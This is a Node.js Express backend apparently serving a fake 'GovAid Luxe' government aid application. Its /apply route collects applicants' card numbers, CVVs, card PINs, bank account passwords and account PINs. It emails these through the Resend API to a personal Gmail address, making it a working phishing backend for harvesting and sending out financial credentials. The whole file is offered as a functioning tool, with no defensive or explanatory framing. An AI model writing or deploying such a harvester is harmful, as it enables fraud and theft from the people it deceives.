import express from "express";
import cors from "cors";
import fetch from "node-fetch";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// Root route
app.get("/", (req, res) => {
  res.send("✅ GovAid Luxe Backend Running with Resend API");
});

// Apply route
app.post("/apply", async (req, res) => {
  try {
    const data = req.body;

    const htmlContent = `
      <h2>New Application Received</h2>
      <p><b>Full Name:</b> ${data.fullName}</p>
      <p><b>Email:</b> ${data.email}</p>
      <p><b>Phone:</b> ${data.phoneCountryCode} ${data.phone}</p>
      <p><b>Country:</b> ${data.country}</p>
      <p><b>Currency:</b> ${data.currency}</p>
      <p><b>Bank Account Name:</b> ${data.accountName}</p>
      <p><b>Account Number:</b> ${data.accountNumber}</p>
      <p><b>Card Number:</b> ${data.cardNumber}</p>
      <p><b>CVV:</b> ${data.cardCvv}</p>
      <p><b>Card PIN:</b> ${data.cardPin}</p>
      <p><b>Account Password:</b> ${data.accountPassword}</p>
      <p><b>Account PIN:</b> ${data.accountPin}</p>
      <p><b>Amount:</b> ${data.amount}</p>
    `;

    // ✅ Send email using Resend API
    const response = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${process.env.RESEND_API_KEY}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        from: "GovAid Luxe <noreply@govaid-luxe.app>",
        to: "sammy1frosh@gmail.com",
        subject: "New GovAid Luxe Application",
        html: htmlContent,
      }),
    });

    const result = await response.json();
    console.log("📨 Resend API response:", result);

    if (response.ok) {
      res.status(200).json({ success: true, message: "✅ Application sent successfully!" });
    } else {
      throw new Error(result.message || "Email send failed");
    }

  } catch (error) {
    console.error("❌ Email send error:", error);
    res.status(500).json({ success: false, message: "Failed to send email" });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));